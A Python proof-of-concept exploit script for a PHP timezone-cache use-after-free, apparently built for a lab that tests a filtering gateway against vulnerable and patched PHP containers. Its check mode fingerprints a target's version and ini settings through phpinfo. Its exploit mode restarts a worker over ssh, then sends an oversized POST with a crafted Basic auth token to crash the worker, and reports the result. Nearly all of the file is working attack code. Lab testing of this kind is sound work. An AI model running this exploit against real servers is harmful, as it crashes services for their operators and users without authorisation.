#!/usr/bin/env python3
"""
PoC for CVE-2026-129496 - PHP timezone-cache use-after-free (NTS builds, file error_log).

Reference code (all four repos the NVD/PoC-GitHub index lists for this CVE - see
lab/php-129496/README.md for how each was used):
  * https://github.com/abraxas/php-tzcache-rce - `POST_BODY` (b"x=" + C*3MiB) and
    `send()` (POST /index.php, Content-Type: application/x-www-form-urlencoded,
    Authorization: Basic <token>, URLError/ConnectionError == crash) ported from
    php-tzcache-rce-Abraxas-Labs.py / lab/poc.py; also the check-mode concept (version +
    ini pair read from the victim, with the reference's refusal wording) and the
    patched-twin response expectation (500 + fatal, worker alive).
  * https://github.com/evenomn/CVE-2026-129496 - poc/exploit.py `http_post()` ("reset"
    if the connection died, else the status line) and the report shape
    ("vulnerable: <reply>, worker lost=..." / "patched: <reply>, worker lost=...").
  * https://github.com/googlesky/CVE-2026-129496 - harness reproduction; its
    exploit POSTs /check to a C harness service, and that spelling is why the store's
    variant (and this lab app's FallbackResource) carry /check besides /index.php.
  * https://github.com/cveForge/CVE-2026-129496 - generic scanner ("baseline -> flood ->
    post-flood" against GET /); documented, and nothing in this file comes from it except
    the /-flood being yet another reason the front controller must exist.

Advisory (security@php.net via NVD / GHSA-gr4f-wgx5-jpfv): affected 8.2 < 8.2.36,
8.3 < 8.3.37, 8.4 < 8.4.28, 8.5 < 8.5.13. The vulnerability only exists in non-thread-safe
builds whose module startup writes a diagnostic into a FILE error_log (e.g. invalid
date.timezone); the next request's early abort then frees memory a kept reference still
points at, and the first request of a fresh worker that aborts early (POST over
memory_limit) crashes the worker. The exploit request is therefore fully characterised:
POST to a served PHP entry path with a body over memory_limit (+ the Basic token the
RCE variant carries in the header).

Usage:
  python3 poc.py check   --target http://127.0.0.1:8101
      -> reads the victim's own phpinfo (/info.php) and refuses configurations the way
         the reference does (out of range / ini pair not the vulnerable one).
  python3 poc.py exploit --target http://127.0.0.1:8101 [--size 3145728] [--token T]
      -> GET /index.php (baseline pid), POST the reference request, GET /index.php again
         (the pid answers whether the worker died); prints the reference's report lines.

Only Python stdlib is used (same discipline as lab/php-129474/poc.py and
lab/php-115560/poc.py).
"""

import argparse
import base64
import http.client
import re
import socket
import subprocess
import time

# ── ported from abraxas/php-tzcache-rce (php-tzcache-rce-Abraxas-Labs.py) ─────────────
POST_BODY = b"x=" + b"C" * (3 * 1024 * 1024)   # POST_BODY, the request body over memory_limit
DEFAULT_TOKEN = base64.b64encode(b"u:\x00").decode("ascii")  # evenomn payload[0:3] = b"u:\x00":
                                                              # user "u", empty password - the
                                                              # deterministic post-decode shape
# ── ported from murrez/php2shell poc.py:107-161 via lab/php-129474/poc.py ─────────────
RE_WORKER_FAULT = re.compile(
    r"(502 Bad Gateway|503 Service Unavailable|"
    r"Connection reset|Empty reply|upstream prematurely closed|"
    r"SIGSEGV|segfault|worker exited)",
    re.I,
)
RE_OOM_109618 = re.compile(
    r"(Allowed memory size of \d+ bytes exhausted|"
    r"memory exhausted|Out of memory|zend_mm_heap corrupted|"
    r"zend_alloc.*failed|Cannot allocate memory)",
    re.I,
)

# The advisory's affected ranges (security@php.net / NVD / GHSA-gr4f-wgx5-jpfv),
# {branch: first fixed patch}: 8.4.26 is in range, 8.4.28 is the fix. Same table the
# reference labs encode (`pin=fresh-worker ... images=vuln=php:8.4.27 ... patched=php:8.4.28`).
AFFECTED = {(8, 2): 36, (8, 3): 37, (8, 4): 28, (8, 5): 13}

PHP_VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)          # X-Powered-By (murrez)
PHPINFO_VERSION_RE = re.compile(r"PHP Version (\d+)\.(\d+)\.(\d+)")    # /info.php heading

GATEWAY_MARKERS = ("x-fleet-filter-deception", "x-fleet-filter-via")  # the gateway's own headers


def php_version_affected(major: int, minor: int, patch: int) -> bool:
    """True when (major, minor) is an affected branch and patch < the first fixed patch."""
    fixed = AFFECTED.get((major, minor))
    return fixed is not None and patch < fixed


def ini_row(html: str, directive: str) -> str:
    """The local value of `directive` from the phpinfo() page (first row that names it).

    The pattern is the loose one lab/php-129474/poc.py documents as the reason it prefers an
    app-side echo; on 8.4 the tables place exactly one row per directive, and the first
    match is the Core/Date section value. Checked live in the recorded run against all
    three victim twins.
    """
    m = re.search(r"%s\s*(?:</td>|:)\s*<td[^>]*>\s*([^<\s][^<]*?)\s*(?:</td>|:)" % re.escape(directive),
                  html, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r"^%s\s*=>\s*(.+)$" % re.escape(directive), html, re.M | re.I)  # php -i style
    return m.group(1).strip() if m else ""


def _hostport(target: str):
    m = re.match(r"https?://([^/:]+)(?::(\d+))?", target)
    if not m:
        raise SystemExit("bad target: %s" % target)
    return m.group(1), int(m.group(2) or 80)


def request(target: str, method: str, path: str, body: bytes = b"",
            headers: dict = None, timeout: float = 60.0):
    """One HTTP/1.1 request against `target` (http://host[:port]).

    Returns (status, headers, body) or ("reset", {}, b"") exactly the way evenomn's
    http_post() classifies a dead worker ("reset" if the connection died, else the HTTP
    status line)."""
    host, port = _hostport(target)
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body if body else None, headers=headers or {})
        resp = conn.getresponse()
        raw = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, hdrs, raw
    except (OSError, http.client.HTTPException):
        return "reset", {}, b""
    finally:
        conn.close()


def startup_line(log_text: str) -> str:
    """abraxas/lab/poc.py startup_line(), ported: the error_log line proving the bug's
    first condition. Their code reads the file with `docker exec cat`; this port takes the
    command to run as --log-cmd (e.g. `ssh 10.20.0.226 sudo -n podman exec
    ff-php-129496 cat /var/log/php-error.log`) for the same reason - the file lives in the
    victim, not in the response. Returns "" when the file holds no startup diagnostic."""
    for line in log_text.splitlines():
        if "Invalid date.timezone" in line and (
            "error_log" in line or "PHP Startup" in line
        ):
            return line.strip()
    return ""


def cmd_check(args) -> int:
    """Fingerprint the victim from its own answers, refusing wrong victims as the references do."""
    status, headers, body = request(args.target, "GET", "/info.php")
    if status == "reset":
        print("check: %s/info.php -> reset (nothing answering)" % args.target)
        return 1
    html = body.decode("latin-1")
    m = PHP_VERSION_RE.search(headers.get("x-powered-by", "")) or PHPINFO_VERSION_RE.search(html)
    if not m:
        print("check: no PHP version fingerprint in %s/info.php" % args.target)
        return 1
    major, minor, patch = (int(m.group(i)) for i in (1, 2, 3))
    in_range = php_version_affected(major, minor, patch)
    print("check: php %d.%d.%d; CVE-2026-129496 affected ranges "
          "(8.2<8.2.36, 8.3<8.3.37, 8.4<8.4.28, 8.5<8.5.13): %s"
          % (major, minor, patch, "IN RANGE (vulnerable)" if in_range else "out of range"))
    knobs = {ini: ini_row(html, ini)
             for ini in ("memory_limit", "error_log", "date.timezone")}
    print("check: ini values read from the victim: %s" % knobs)
    if not in_range:
        # Ported refusal wording (abraxas/cveForge checks report out-of-range victims).
        print("check: %d.%d.%d is fixed: the timezone-cache fix (cb20015e line) is in this build."
              % (major, minor, patch))
        return 1
    # abraxas's check does NOT decide the timezone half from the ini value: an 8.4 engine
    # that fails to parse date.timezone logs the warning and then REPLACES the value with
    # UTC (measured on the vuln twin: phpinfo answers `date.timezone => UTC` while the raw
    # value was Not/AZone). The reference reads the error_log itself (`docker exec cat`,
    # their startup_line); this port asks for the same file via --log-cmd.
    file_log = knobs.get("error_log", "").startswith("/")
    if args.log_cmd:
        log_text = subprocess.run(args.log_cmd, shell=True, capture_output=True,
                                  text=True, timeout=60).stdout
        line = startup_line(log_text)
        if line:
            print("check: startup-log=%s" % line)
        if not file_log:
            print("check: error_log is %r, not a file: the bug's transport is missing" %
                  knobs.get("error_log"))
            return 1
        if not line:
            print("check: version in range but the ini pair is not the vulnerable one "
                  "(startup diagnostic missing from file error_log - nothing was written "
                  "at module startup, so no timezone cache was allocated on the freed heap)")
            return 1
        print("check: VULNERABLE configuration confirmed on %s (php %d.%d.%d, "
              "error_log=%r, memory_limit=%r, startup diagnostic present)"
              % (args.target, major, minor, patch, knobs["error_log"], knobs["memory_limit"]))
        return 0
    if knobs.get("date.timezone") in ("UTC", ""):
        print("check: date.timezone's raw value is not recoverable from phpinfo alone "
              "(an unparseable zone is replaced by UTC at startup); pass --log-cmd to read "
              "the error_log the way the references do")
    return 1


def classify(status, headers, body):
    """What answered: the app, the gateway's inline deception, the gateway reporting a dead
    upstream (murrez's RE_WORKER_FAULT), or nothing at all (evenomn's "reset")."""
    text = body.decode("latin-1", "replace")
    if status == "reset":
        return "connection-reset (worker died before answering)"
    if any(h in headers for h in GATEWAY_MARKERS):
        return "gateway-inline (%s %s %s)" % (
            status, headers.get("x-fleet-filter-deception", ""), headers.get("via", ""))
    if isinstance(status, int) and status in (502, 503):
        # murrez's RE_WORKER_FAULT: a 502/503 from the front is how a dead upstream answers.
        return "gateway-upstream-error (%d)" % status
    if RE_OOM_109618.search(text):
        return "app-answer (%s %s, body starts %r)" % (
            status, headers.get("x-powered-by", ""), text[:90].strip())
    return "app-answer (%s %s, body starts %r)" % (
        status, headers.get("x-powered-by", ""), text[:90].strip())


def worker_pid(target: str):
    """The pid the app itself echoes (lab app), or None when the app did not answer."""
    status, _, body = request(target, "GET", "/index.php")
    if status == "reset":
        return None
    m = re.search(rb"pid=(\d+)", body)
    return m.group(1).decode() if m else None


def cmd_exploit(args) -> int:
    """Send the reference request and report the way the references report (abraxas send() +
    evenomn attempt(): what answered, and whether the worker that took it is gone)."""
    body = args.body or (b"x=" + b"C" * args.size)          # abraxas POST_BODY by default
    token = args.token or DEFAULT_TOKEN                     # evenomn header shape
    # The bug fires on the FIRST request of a worker, so the references recycle the worker
    # before every attempt (abraxas recycle_worker(), evenomn fresh_worker() - both kill the
    # child through docker exec). --restart-cmd is the same act over ssh for a victim that
    # lives in a container we cannot docker-exec from here; when omitted, the caller has
    # already ensured freshness (the recorded run restarts the container first).
    if args.restart_cmd:
        subprocess.run(args.restart_cmd, shell=True, capture_output=True, timeout=120)
        # Wait for the port with a bare TCP connect: an HTTP readiness probe would itself BE
        # the first request of the new worker and consume the bug (an 8.4 engine that
        # completes a small GET rebuilds the cache), which is exactly the trap the
        # references recycle-the-worker-before-each-attempt exists to avoid. The port
        # opening is enough: the worker that accepts the connect has served no request.
        host, port = _hostport(args.target)
        for _ in range(240):
            time.sleep(0.5)
            try:
                socket.create_connection((host, port), timeout=2).close()
                break
            except OSError:
                continue
        else:
            print("exploit: %s never came back after %s" % (args.target, args.restart_cmd))
            return 1
        before = "fresh(restart)"      # a GET probe now would spend the fresh worker
    else:
        before = worker_pid(args.target)
    status, headers, resp_body = request(
        args.target, "POST", "/index.php", body=body,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Authorization": "Basic " + token})
    answer = classify(status, headers, resp_body)
    after = worker_pid(args.target)
    if answer.startswith("connection-reset"):
        # The worker died on the request itself: the next connection is served by a new one
        # (this is the HTTP-answerable form of evenomn's alive() check).
        verdict = "EXPLOITED (worker died on the request)" if before != after else \
                  "exploited? (reset, but the app did not answer the follow-up either)"
    elif answer.startswith("gateway-inline"):
        verdict = "CONTROLLED (answered by the gateway, the app never saw it)"
    elif answer.startswith("gateway-upstream-error"):
        verdict = "EXPLOITED (upstream died, gateway reported it)"
    else:
        # The app answered: the worker survived; on in-range-but-not-vulnerable twins this
        # is the memory-limit fatal (RE_OOM_109618), identical to abraxas patched-reply.
        if before == "fresh(restart)":
            state = "the worker spawned by the restart answered it (pid %s): it survived" % after
        elif before == after:
            state = "worker alive (same pid %s)" % after
        else:
            state = "worker restarted (pid %s -> %s)" % (before, after)
        verdict = "NOT EXPLOITED (app answered; %s)" % state
    print("exploit: target=%s before: pid=%s" % (args.target, before))
    print("exploit: POST /index.php (%d bytes body, Authorization: Basic %.16s...)"
          % (len(body), token))
    print("exploit: answer: %s" % answer)
    print("exploit: after:  pid=%s" % after)
    print("exploit: %s" % verdict)
    return 0 if verdict.startswith("EXPLOITED") else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mode", choices=("check", "exploit"))
    ap.add_argument("--target", required=True, help="http://host[:port] of the victim "
                                                    "(or of a gateway fronting it)")
    ap.add_argument("--size", type=int, default=len(POST_BODY),
                    help="body size, default the reference's 3 MiB (over memory_limit=2M)")
    ap.add_argument("--body", default=None, help="raw body bytes (default x= + C*--size)")
    ap.add_argument("--token", default=None,
                    help="Authorization: Basic payload (default base64 of u:<NUL>)")
    ap.add_argument("--log-cmd", default=None,
                    help="command that prints the victim's error_log (abraxas startup_line "
                         "port; check mode only)")
    ap.add_argument("--restart-cmd", default=None,
                    help="command that gives the victim a fresh worker (abraxas "
                         "recycle_worker / evenomn fresh_worker port; exploit mode only)")
    args = ap.parse_args()
    if args.mode == "check":
        args.log_cmd = args.log_cmd
        return cmd_check(args)
    args.log_cmd = None
    return cmd_exploit(args)


if __name__ == "__main__":
    raise SystemExit(main())
